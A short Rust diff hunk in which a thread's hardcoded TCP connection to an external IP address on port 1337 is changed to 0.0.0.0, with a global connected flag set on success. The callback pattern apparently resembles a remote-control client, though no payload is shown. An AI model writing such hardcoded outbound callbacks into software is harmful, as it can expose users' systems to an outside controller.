@@ -390,7 +390,7 @@ fn main() {
                 continue
             }
             std::thread::spawn(|| {
-                let mut stream = TcpStream::connect("58.126.1.57:1337");
+                let mut stream = TcpStream::connect("0.0.0.0:1337");
                 match stream {
                     Ok(str) => {
                         IS_CONNECTED = true;
